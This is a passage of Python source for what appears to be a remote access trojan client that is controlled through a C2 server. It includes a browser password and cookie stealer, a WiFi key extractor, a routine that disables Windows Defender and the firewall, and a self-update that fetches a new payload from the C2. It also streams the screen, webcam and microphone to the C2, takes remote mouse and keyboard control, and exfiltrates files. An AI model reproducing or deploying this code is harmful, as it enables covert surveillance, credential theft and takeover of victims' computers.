                                    decrypted = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                                results.append(f"URL: {url}\nUser: {user}\nPass: {decrypted}\n")
                            except Exception as err:
                                results.append(f"URL: {url}\nUser: {user}\nPass: [DECRYPT FAILED: {str(err)}]\n")
                    else:
                        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies LIMIT 200')
                        for host, name, enc_val in cursor.fetchall():
                            try:
                                if enc_val.startswith(b'v10') or enc_val.startswith(b'v11'):
                                    from Crypto.Cipher import AES
                                    iv = enc_val[3:15]; payload_bytes = enc_val[15:-16]; tag = enc_val[-16:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                                    decrypted = cipher.decrypt_and_verify(payload_bytes, tag).decode('utf-8', errors='ignore')
                                else:
                                    import win32crypt
                                    decrypted = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                                results.append(f"{host} | {name} = {decrypted[:80]}")
                            except: pass
                except: pass
                conn.close()
                try: os.remove(temp_db)
                except: pass
        except Exception as e:
            results.append(f"{browser_name}: Error - {e}")
    
    if not results: return None, "No browser data found."
    output = "\n".join(results)
    filepath = os.path.join(os.getenv('TEMP'), f'browser_{mode}.txt')
    with open(filepath, 'w', encoding='utf-8') as f: f.write(output)
    return filepath, None

# ---- Main entry point with 3-tier fallback ----
def steal_browser_data(mode='passwords'):
    """Steal browser data with 3-tier fallback:
    1. DumpBrowserSecrets (Maldev) - Best: bypasses Defender + ABE
    2. ChromeElevator (xaitax) - Backup: often blocked by Defender
    3. DPAPI - Last resort: only works for non-ABE browsers
    """
    if platform.system() != "Windows": return None, "Browser stealer is Windows-only."
    
    # Tier 1: DumpBrowserSecrets (proven to bypass Defender + ABE)
    filepath, err = steal_browser_data_dbs(mode)
    if filepath: return filepath, None
    log(f"[!] Tier 1 DumpBrowserSecrets failed: {err}")
    
    # Tier 2: ChromeElevator (backup, may be blocked by AV)
    filepath, err2 = steal_browser_data_chromelevator(mode)
    if filepath: return filepath, None
    log(f"[!] Tier 2 ChromeElevator failed: {err2}")
    
    # Tier 3: Legacy DPAPI (only works for v10/old browsers/Opera/Vivaldi)
    log(f"[!] All ABE tools failed, falling back to DPAPI...")
    if mode == 'all': mode = 'passwords'
    return steal_browser_data_dpapi(mode)

def steal_wifi():
    """Extract all saved WiFi passwords using netsh."""
    if platform.system() != "Windows": return None, "WiFi stealer is Windows-only."
    try:
        cf = subprocess.CREATE_NO_WINDOW
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, creationflags=cf)
        profiles = [line.split(':')[1].strip() for line in result.stdout.split('\n') if 'All User Profile' in line]
        
        wifi_list = []
        for profile in profiles:
            try:
                detail = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'], capture_output=True, text=True, creationflags=cf)
                password = ''
                for line in detail.stdout.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        break
                wifi_list.append(f"SSID: {profile}  |  Password: {password if password else '[OPEN/NO KEY]'}")
            except: pass
        
        return "\n".join(wifi_list) if wifi_list else "No WiFi profiles found.", None
    except Exception as e:
        return None, f"WiFi steal failed: {e}"

def av_kill():
    """Attempt to disable Windows Defender and Firewall."""
    if platform.system() != "Windows": return None, "AV Killer is Windows-only."
    results = []
    cf = subprocess.CREATE_NO_WINDOW
    
    commands = [
        ("Disable Defender Real-time", 'Set-MpPreference -DisableRealtimeMonitoring $true'),
        ("Exclude C:\\ from scans", 'Add-MpPreference -ExclusionPath "C:\\"'),
        ("Disable Behavior Monitoring", 'Set-MpPreference -DisableBehaviorMonitoring $true'),
        ("Disable IOAV Protection", 'Set-MpPreference -DisableIOAVProtection $true'),
        ("Disable Script Scanning", 'Set-MpPreference -DisableScriptScanning $true'),
        ("Disable Firewall (Domain)", 'Set-NetFirewallProfile -Profile Domain -Enabled False'),
        ("Disable Firewall (Private)", 'Set-NetFirewallProfile -Profile Private -Enabled False'),
        ("Disable Firewall (Public)", 'Set-NetFirewallProfile -Profile Public -Enabled False'),
    ]
    
    for desc, ps_cmd in commands:
        try:
            r = subprocess.run(['powershell.exe', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, creationflags=cf, timeout=10)
            status = "✅ OK" if r.returncode == 0 else f"❌ BLOCKED ({r.stderr.strip()[:60]})"
            results.append(f"{desc}: {status}")
        except Exception as e:
            results.append(f"{desc}: ❌ ERROR ({e})")
    
    return "\n".join(results), None

def self_update(client_id):
    """Download new payload version from C2 and restart."""
    try:
        r = requests.get(f"{C2_URL}/update", timeout=30, verify=False)
        if r.status_code == 200:
            script_path = os.path.abspath(sys.argv[0])
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(r.text)
            os.execv(sys.executable, [sys.executable, script_path])
        else:
            return f"C2 returned {r.status_code}. No update available."
    except Exception as e:
        return f"Self-update failed: {e}"

# =========================================================================
# Phase 10: Live Screen Remote Access
# =========================================================================

_live_streaming = False
_live_thread = None
_live_proc = None
_live_quality = 'high'

QUALITY_PRESETS = {
    'ultra':  {'res': None,       'fps': 30, 'bitrate': '2500k'},
    'high':   {'res': '1280x720', 'fps': 30, 'bitrate': '1500k'},
    'medium': {'res': '960x540',  'fps': 25, 'bitrate': '800k'},
    'low':    {'res': '640x360',  'fps': 24, 'bitrate': '400k'},
    'audio':  {'res': None,       'fps': 0,  'bitrate': '0'},
}

def enable_stereo_mix():
    """Try to enable Stereo Mix recording device on Windows."""
    try:
        cf = subprocess.CREATE_NO_WINDOW
        # Enable all disabled recording devices via PowerShell
        ps = 'Get-PnpDevice -Class AudioEndpoint | Where-Object {$_.FriendlyName -like "*Stereo*" -and $_.Status -ne "OK"} | Enable-PnpDevice -Confirm:$false -ErrorAction SilentlyContinue'
        subprocess.run(['powershell.exe', '-NoProfile', '-Command', ps], 
                      capture_output=True, creationflags=cf, timeout=10)
    except: pass

def get_audio_devices():
    """Get available audio devices. Returns (system_audio, microphone)."""
    try:
        cf = subprocess.CREATE_NO_WINDOW
        # First try to enable Stereo Mix
        enable_stereo_mix()
        time.sleep(1)
        
        r = subprocess.run(['ffmpeg', '-list_devices', 'true', '-f', 'dshow', '-i', 'dummy'], 
                          capture_output=True, text=True, creationflags=cf)
        out = r.stderr
        devs = []
        for line in out.splitlines():
            if "(audio)" in line and '"' in line:
                name = line.split('"')[1]
                devs.append(name)
        
        system_audio = None
        microphone = None
        for d in devs:
            dl = d.lower()
            if any(x in dl for x in ['stereo mix', 'what u hear', 'wave out', 'loopback']):
                system_audio = d
            elif any(x in dl for x in ['microphone', 'mic', 'audio input', 'realtek']):
                microphone = d
        
        log(f"[*] Audio devices found: system={system_audio}, mic={microphone}")
        return system_audio, microphone
    except Exception as e:
        log(f"[!] Audio device scan error: {e}")
        return None, None

def live_stream_ffmpeg(client_id):
    """Stream screen/audio as MPEG-TS to C2 via WebSocket (works through Cloudflare)."""
    global _live_streaming, _live_proc
    import websocket
    
    quality = QUALITY_PRESETS.get(_live_quality, QUALITY_PRESETS['high'])
    cmd = ['ffmpeg', '-y', '-hide_banner', '-loglevel', 'error',
           '-probesize', '32', '-analyzeduration', '0']  # Fast start
    
    # Video Input
    if _live_quality != 'audio':
        cmd.extend(['-f', 'gdigrab', '-framerate', str(quality['fps']), '-i', 'desktop'])
    else:
        cmd.extend(['-f', 'lavfi', '-i', 'color=c=black:s=640x360:r=5'])
        
    # Audio Input — try to capture BOTH system audio and microphone
    system_audio, microphone = get_audio_devices()
    audio_inputs = 0
    
    if system_audio:
        cmd.extend(['-f', 'dshow', '-i', f'audio={system_audio}'])
        audio_inputs += 1
    if microphone:
        cmd.extend(['-f', 'dshow', '-i', f'audio={microphone}'])
        audio_inputs += 1
        
    # Encoding Options — MPEG1 Video + MP2 Audio for JSMpeg compatibility
    if _live_quality != 'audio':
        cmd.extend(['-c:v', 'mpeg1video', '-b:v', quality['bitrate'], '-bf', '0'])  # No B-frames = lower latency
        if quality['res']:
            w, h = quality['res'].split('x')
            cmd.extend(['-vf', f'scale={w}:{h}'])
    else:
        cmd.extend(['-c:v', 'mpeg1video', '-b:v', '50k', '-bf', '0'])
    
    # Audio encoding — mix multiple audio inputs if both available
    if audio_inputs == 2:
        # Mix system audio + microphone together
        cmd.extend(['-filter_complex', 'amix=inputs=2:duration=longest',
                    '-c:a', 'mp2', '-b:a', '128k', '-ar', '44100', '-ac', '1'])
    elif audio_inputs == 1:
        cmd.extend(['-c:a', 'mp2', '-b:a', '128k', '-ar', '44100', '-ac', '1'])
    # else: no audio
        
    cmd.extend(['-f', 'mpegts', '-flush_packets', '1', 'pipe:1'])
    
    # Build WebSocket URL from C2_URL
    ws_url = C2_URL.replace('https://', 'wss://').replace('http://', 'ws://')
    ws_url = f"{ws_url}/stream_up/{client_id}"
    
    cf = subprocess.CREATE_NO_WINDOW
    ws = None
    try:
        log(f"[*] FFmpeg cmd: {' '.join(cmd)}")
        log(f"[*] WebSocket URL: {ws_url}")
        log(f"[*] Audio: system={system_audio}, mic={microphone}")
        
        # Connect WebSocket to C2
        ws = websocket.WebSocket()
        ws.connect(ws_url)
        log("[+] WebSocket connected to C2 for streaming")
        
        # Start FFmpeg process
        _live_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
            creationflags=cf, bufsize=0
        )
        
        # Read FFmpeg stdout and send via WebSocket (larger chunks = less stutter)
        while _live_streaming and _live_proc.poll() is None:
            chunk = _live_proc.stdout.read(16384)
            if not chunk:
                break
            try:
                ws.send_binary(chunk)
            except Exception as e:
                log(f"[!] WebSocket send error: {e}")
                break
                
        # Check if FFmpeg had errors
        if _live_proc and _live_proc.poll() is not None:
            stderr_out = _live_proc.stderr.read().decode(errors='ignore')
            if stderr_out:
                log(f"[!] FFmpeg stderr: {stderr_out[:500]}")
                
    except Exception as e:
        log(f"[!] Live stream error: {e}")
    finally:
        if ws:
            try: ws.close()
            except: pass
        live_stop()

def live_start(client_id):
    """Start live screen streaming."""
    global _live_streaming, _live_thread
    
    if _live_streaming:
        return "Live stream already running."
    
    _live_streaming = True
    _live_thread = _th.Thread(target=live_stream_ffmpeg, args=(client_id,), daemon=True)
    _live_thread.start()
    
    return f"Live stream started (quality: {_live_quality}). View at: /live/{client_id[:8]}"

def live_stop():
    """Stop live screen streaming."""
    global _live_streaming, _live_proc
    _live_streaming = False
    if _live_proc:
        try: _live_proc.kill()
        except: pass
        _live_proc = None
    return "Live stream stopped."

def live_set_quality(quality):
    """Change live stream quality."""
    global _live_quality
    if quality in QUALITY_PRESETS:
        _live_quality = quality
        return f"Quality changed to: {quality}"
    return f"Unknown quality: {quality}. Use: ultra/high/medium/low/audio"

def live_status():
    """Get live stream status."""
    return f"Streaming: {_live_streaming}, Quality: {_live_quality}"

def execute_input_event(event):
    """Execute mouse/keyboard input event from operator."""
    if platform.system() != "Windows": return
    try:
        import ctypes
        user32 = ctypes.windll.user32
        
        if event.get('type') == 'click':
            # Get screen dimensions
            sw = user32.GetSystemMetrics(0)
            sh = user32.GetSystemMetrics(1)
            
            x = int(event.get('x', 0) * sw)
            y = int(event.get('y', 0) * sh)
            
            user32.SetCursorPos(x, y)
            time.sleep(0.05)
            
            if event.get('button') == 'left':
                user32.mouse_event(0x0002, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTDOWN
                time.sleep(0.05)
                user32.mouse_event(0x0004, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTUP
            elif event.get('button') == 'right':
                user32.mouse_event(0x0008, 0, 0, 0, 0)  # MOUSEEVENTF_RIGHTDOWN
                time.sleep(0.05)
                user32.mouse_event(0x0010, 0, 0, 0, 0)  # MOUSEEVENTF_RIGHTUP
        
        elif event.get('type') in ['keydown', 'keyup']:
            # Map common keys to VK codes
            key = event.get('key', '')
            VK_MAP = {
                'Enter': 0x0D, 'Backspace': 0x08, 'Tab': 0x09, 'Escape': 0x1B,
                'Delete': 0x2E, 'Home': 0x24, 'End': 0x23,
                'ArrowLeft': 0x25, 'ArrowUp': 0x26, 'ArrowRight': 0x27, 'ArrowDown': 0x28,
                'Control': 0xA2, 'Shift': 0x10, 'Alt': 0x12,
                ' ': 0x20, 'F1': 0x70, 'F2': 0x71, 'F3': 0x72, 'F4': 0x73,
                'F5': 0x74, 'F6': 0x75, 'F7': 0x76, 'F8': 0x77,
            }
            
            if key in VK_MAP:
                vk = VK_MAP[key]
            elif len(key) == 1:
                vk = ord(key.upper())
            else:
                return
            
            flags = 0x0000 if event['type'] == 'keydown' else 0x0002  # KEYEVENTF_KEYUP
            user32.keybd_event(vk, 0, flags, 0)
    except Exception as e:
        log(f"[!] Input event error: {e}")


def main():
    log("[*] Initializing stateful shell...")
    shell = StatefulShell()
    os_info = f"{platform.system()} {platform.release()}"
    
    while True:
        client_id = None
        while not client_id:
            try:
                log(f"[*] Attempting to register with C2 at {C2_URL}...")
                r = requests.post(f"{C2_URL}/register", 
                                 json={'os_info': os_info}, 
                                 headers={'ngrok-skip-browser-warning': '1'},
                                 timeout=10, verify=False)
                r.raise_for_status()
                client_id = r.json().get('client_id')
                log(f"[+] Registered with ID: {client_id}")
            except Exception as e:
                log(f"[!] C2 registration failed: {e}. Retrying in {HEARTBEAT_INTERVAL}s...")
                time.sleep(HEARTBEAT_INTERVAL)
                
        while True:
            try:
                r = requests.post(f"{C2_URL}/heartbeat/{client_id}", 
                                 json={'cwd': shell.cwd}, 
                                 headers={'ngrok-skip-browser-warning': '1'},
                                 timeout=10, verify=False)
                r.raise_for_status()
                resp_data = r.json()
                tasks = resp_data.get('tasks', [])
                
                # Phase 10: Process input events from live viewer
                for ie in resp_data.get('input_events', []):
                    try: execute_input_event(ie)
                    except: pass
                
                for task in tasks:
                    cmd_id = task.get('cmd_id')
                    command_line = task.get('command', '').strip()
                    if not command_line: continue
                    parts = command_line.split()
                    cmd = parts[0].lower()
                    output = ""
                    
                    if cmd in ["geolocate", "geo"]: 
                        report, err = get_geolocation(); output = err if err else report
                    elif cmd in ["screenshot", "ss"]: 
                        filepath, err = take_screenshot(); output = err if err else exfiltrate_file(filepath, client_id, f"Screenshot: `{client_id}` (CMD: `{command_line}`)")
                    elif cmd in ["webcam", "wc"]: 
                        filepath, err = take_webcam_photo(); output = err if err else exfiltrate_file(filepath, client_id, f"Webcam: `{client_id}` (CMD: `{command_line}`)")
                    elif cmd in ["record_video", "rec_v"]: 
                        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        mode = parts[2].lower() if len(parts) > 2 else 'cam'
                        filepath, err = record_video(seconds, mode); output = err if err else exfiltrate_file(filepath, client_id, f"Video ({mode}, {seconds}s): `{client_id}` (CMD: `{command_line}`)")
                    elif cmd in ["record_audio", "rec_a"]: 
                        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10; filepath, err = record_audio(seconds); output = err if err else exfiltrate_file(filepath, client_id, f"Audio ({seconds}s): `{client_id}` (CMD: `{command_line}`)")
                    elif cmd in ["export", "exp"]:
                        filepath = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                        output = exfiltrate_file(filepath, client_id, f"Export: `{filepath}` (CMD: `{command_line}`)") if filepath else "Error: filename required."
                    elif cmd == "sys_upload":
                        filename = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                        if filename:
                            try:
                                r = requests.get(f"{C2_URL}/serve/{filename}", timeout=30, verify=False)
                                if r.status_code == 200:
                                    save_path = os.path.join(shell.cwd, filename)
                                    with open(save_path, "wb") as f: f.write(r.content)
                                    output = f"Uploaded `{filename}` successfully to `{shell.cwd}`."
                                else: output = f"Failed to download {filename} from C2."
                            except Exception as e: output = f"sys_upload error: {e}"
                        else: output = "sys_upload error: no filename"
                    elif cmd == "record":
                        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        mode = 'full' if '--full' in command_line.lower() else 'normal'
                        filepath, err = record_av(seconds, mode)
                        output = err if err else exfiltrate_file(filepath, client_id, f"AV-Sync Record ({mode}, {seconds}s): `{client_id}` (CMD: `{command_line}`)")
                    elif cmd == "steal":
                        mode = parts[1].lower() if len(parts) > 1 else 'passwords'
                        filepath, err = steal_browser_data(mode)
                        output = err if err else exfiltrate_file(filepath, client_id, f"🍪 Browser {mode}: `{client_id}` (CMD: `{command_line}`)")
                    elif cmd == "wifi":
                        report, err = steal_wifi(); output = err if err else report
                    elif cmd == "avkill":
                        report, err = av_kill(); output = err if err else report
                    elif cmd == "sys_update":
                        output = self_update(client_id) or "Restarting with new payload..."
                    # --- Phase 10: Live Screen Commands ---
                    elif cmd == "live":
                        sub = parts[1].lower() if len(parts) > 1 else "status"
                        if sub == "start":
                            output = live_start(client_id)
                        elif sub == "stop":
                            output = live_stop()
                        elif sub == "quality":
                            q = parts[2].lower() if len(parts) > 2 else "high"
                            output = live_set_quality(q)
                        else:
                            output = live_status()
                    else: 
                        output = shell.execute(command_line)
                    
                    if output:
                        post_output(client_id, cmd_id, command_line, str(output))
            except requests.exceptions.RequestException:
                log("[!] C2 connection lost. Re-registering...")
                live_stop()  # Stop streaming on disconnect
                break
            except Exception as e:
                log(f"[!] Main loop error: {e}")

            time.sleep(HEARTBEAT_INTERVAL)

if __name__ == '__main__':
    _boot_log("ENTERING MAIN()")
    try:
        main()
    except Exception as e:
        _boot_log(f"FATAL CRASH: {e}")
        import traceback
        _boot_log(traceback.format_exc())